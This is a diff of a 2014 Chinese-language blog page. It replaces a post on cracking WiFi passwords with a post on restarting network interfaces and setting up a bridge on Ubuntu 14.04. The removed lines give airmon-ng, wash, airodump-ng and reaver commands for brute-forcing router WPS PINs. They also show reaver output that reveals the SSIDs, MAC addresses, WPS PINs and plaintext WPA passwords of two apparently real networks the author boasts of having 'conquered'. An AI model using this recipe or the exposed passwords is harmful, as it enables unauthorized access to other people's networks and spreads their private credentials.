@@ -4,12 +4,13 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>wifi密码破解实战 | zhangyan&#39;s blog</title>
+    <title>ubuntu14.04网卡重启的改变 | zhangyan&#39;s blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
     
     <meta name="author" content="张岩">
     
-    <meta name="description" content="1234airmon-ng start wlan0 #开启监听模式wash -i mon0 -C #查看所有开启WPS的无线路由长时间无反应按Ctrl+C，结束进程,这时记下你要破解的目标路由MAC.airodump-ng mon0 #网卡以混杂模式扫描所有频道—并显示所有AP的信息reaver -">
+    <meta name="description" content="Ubuntu14.04修改配置，重启网卡没有生效，出现如下问题：
+12345678# cat /etc/issueUbuntu 14.04 LTS \n \l# service  networking restartstop: Job failed while stoppingstart: Job ">
     
     
     
@@ -68,15 +69,15 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2014/11/10/wifi密码破解实战/" title="wifi密码破解实战" itemprop="url">wifi密码破解实战</a>
+      <a href="/2014/11/13/ubuntu14.04网卡重启的改变/" title="ubuntu14.04网卡重启的改变" itemprop="url">ubuntu14.04网卡重启的改变</a>
   </h1>
   <p class="article-author">By
     
       <a href="http://yan.lingyun.io" title="张岩">张岩</a>
     </p>
   <p class="article-time">
-    <time datetime="2014-11-10T06:38:24.000Z" itemprop="datePublished">11月 10 2014</time>
-    更新日期:<time datetime="2014-11-10T06:38:24.000Z" itemprop="dateModified">11月 10 2014</time>
+    <time datetime="2014-11-13T11:57:24.000Z" itemprop="datePublished">11月 13 2014</time>
+    更新日期:<time datetime="2014-11-13T11:57:24.000Z" itemprop="dateModified">11月 13 2014</time>
     
   </p>
 </header>
@@ -88,13 +89,18 @@
 		
 		</div>
 		
-		<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">airmon-ng start wlan0 <span class="comment">#开启监听模式</span></div><div class="line">wash -i mon0 -C <span class="comment">#查看所有开启WPS的无线路由长时间无反应按Ctrl+C，结束进程,这时记下你要破解的目标路由MAC.</span></div><div class="line">airodump-ng mon0 <span class="comment">#网卡以混杂模式扫描所有频道—并显示所有AP的信息</span></div><div class="line">reaver -i mon0 -b MAC <span class="operator">-a</span> -S -vv -c 频道 <span class="comment">#可以去睡觉了</span></div></pre></td></tr></table></figure>
+		<p>Ubuntu14.04修改配置，重启网卡没有生效，出现如下问题：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># cat /etc/issue</div><div class="line">Ubuntu 14.04 LTS \n \l</div><div class="line"># service  networking restart</div><div class="line"><span class="operator"><span class="keyword">stop</span>: Job failed while stopping</span></div><div class="line"><span class="keyword">start</span>: Job <span class="keyword">is</span> already running: networking</div><div class="line"># tail -f /<span class="keyword">var</span>/<span class="keyword">log</span>/upstart/networking.<span class="keyword">log</span></div><div class="line">Stopping <span class="keyword">or</span> restarting the networking job <span class="keyword">is</span> <span class="keyword">not</span> supported.</div><div class="line"><span class="keyword">Use</span> ifdown & ifup <span class="keyword">to</span> reconfigure desired interface.</div></pre></td></tr></table></figure>
 
-<p>一觉醒来</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">BC:D1:<span class="number">77</span>:F5:<span class="number">63</span>:<span class="number">6</span>A  WPA2 CCMP   PSK  TP-LINK_F5636A</div><div class="line">[+] <span class="number">92.54</span>% complete @ <span class="number">2014</span>-<span class="number">08</span>-<span class="number">22</span> <span class="number">23</span>:<span class="number">34</span>:<span class="number">31</span> (<span class="number">4</span> seconds/pin)</div><div class="line">[+] Max time remaining at this rate: <span class="number">0</span>:<span class="number">54</span>:<span class="number">44</span> (<span class="number">821</span> pins left <span class="keyword">to</span> <span class="keyword">try</span>)</div><div class="line">[+] Trying pin <span class="number">36861705</span></div><div class="line">[+] Sending EAPOL START request</div><div class="line">[+] Received identity request</div><div class="line">[+] Sending identity response</div><div class="line">[+] Received M1 <span class="keyword">message</span></div><div class="line">[+] Sending M2 <span class="keyword">message</span></div><div class="line">[+] Received M3 <span class="keyword">message</span></div><div class="line">[+] Sending M4 <span class="keyword">message</span></div><div class="line">[+] Received M5 <span class="keyword">message</span></div><div class="line">[+] Sending M6 <span class="keyword">message</span></div><div class="line">[+] Received M7 <span class="keyword">message</span></div><div class="line">[+] Sending WSC NACK</div><div class="line">[+] Sending WSC NACK</div><div class="line">[+] Pin cracked <span class="keyword">in</span> <span class="number">3068</span> seconds</div><div class="line">[+] WPS PIN: <span class="string">'36861705'</span></div><div class="line">[+] WPA PSK: <span class="string">'lzy230105'</span></div><div class="line">[+] AP SSID: <span class="string">'TP-LINK_F5636A'</span></div></pre></td></tr></table></figure>
+<p>从以上日志内容可以看出，传统的service重启和停止网络已经不再支持了，需要通过使用ifdown &amp; ifup来实现相应的操作。</p>
+<p>重启指定网卡</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor"># ifdown eth0 && ifup eth0</span></div></pre></td></tr></table></figure>
 
-<p>又攻克一个</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[+] Max time remaining at <span class="keyword">this</span> rate: <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span> (<span class="number">0</span> pins left to <span class="keyword">try</span>)</div><div class="line">[+] Pin cracked <span class="keyword">in</span> <span class="number">7832</span> seconds</div><div class="line">[+] WPS PIN: <span class="string">'17366311'</span></div><div class="line">[+] WPA PSK: <span class="string">'jialili112358'</span></div><div class="line">[+] AP SSID: <span class="string">'jialili1001'</span></div><div class="line"><span class="number">9</span>C:<span class="number">21</span>:<span class="number">6</span>A:A6:<span class="number">3</span>A:DE WPA2 CCMP   PSK  jialili1001</div></pre></td></tr></table></figure>
+<p>重启除lo网卡的所有网卡</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ifdown --exclude=lo -a && sudo ifup --exclude=lo -a</span></div></pre></td></tr></table></figure>
+
+<p>配置桥接</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># apt-get install bridge-utils</span></div><div class="line"><span class="comment"># cat /etc/network/interfaces</span></div><div class="line"><span class="title">auto</span> lo</div><div class="line">iface lo inet loopback</div><div class="line"></div><div class="line">auto eth0</div><div class="line">iface eth0 inet manual</div><div class="line"></div><div class="line">auto br0</div><div class="line">iface br0 inet static</div><div class="line">address <span class="number">192.168.0.10</span></div><div class="line">netmask <span class="number">255.255.255.0</span></div><div class="line">gateway <span class="number">192.168.0.1</span></div><div class="line">bridge_ports eth0</div><div class="line">bridge_stp <span class="built_in">off</span></div><div class="line">bridge_fd <span class="number">0</span></div><div class="line">bridge_maxwait <span class="number">0</span></div><div class="line">dns-nameservers <span class="number">192.168.0.1</span></div><div class="line"><span class="comment"># ifup br0</span></div><div class="line"><span class="comment"># brctl  show</span></div><div class="line">bridge name   bridge id       STP enabled interfaces</div><div class="line">br0       <span class="number">8000</span>.02000a0080e1   <span class="built_in">no</span>      eth0</div></pre></td></tr></table></figure>
 
   
 	</div>
@@ -105,7 +111,7 @@
 
 <div class="article-share" id="share">
 
-  <div data-url="http://yan.lingyun.io/2014/11/10/wifi密码破解实战/" data-title="wifi密码破解实战 | zhangyan&#39;s blog" data-tsina="null" class="share clearfix">
+  <div data-url="http://yan.lingyun.io/2014/11/13/ubuntu14.04网卡重启的改变/" data-title="ubuntu14.04网卡重启的改变 | zhangyan&#39;s blog" data-tsina="null" class="share clearfix">
   </div>
 
 </div>
@@ -114,19 +120,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2014/11/13/ubuntu14.04网卡重启的改变/" title="ubuntu14.04网卡重启的改变">
-  <strong>PREVIOUS:</strong><br/>
-  <span>
-  ubuntu14.04网卡重启的改变</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2014/11/10/Systemd服务管理/"  title="Systemd服务管理">
+<a href="/2014/11/10/wifi密码破解实战/"  title="wifi密码破解实战">
  <strong>NEXT:</strong><br/> 
- <span>Systemd服务管理
+ <span>wifi密码破解实战
 </span>
 </a>
 </div>
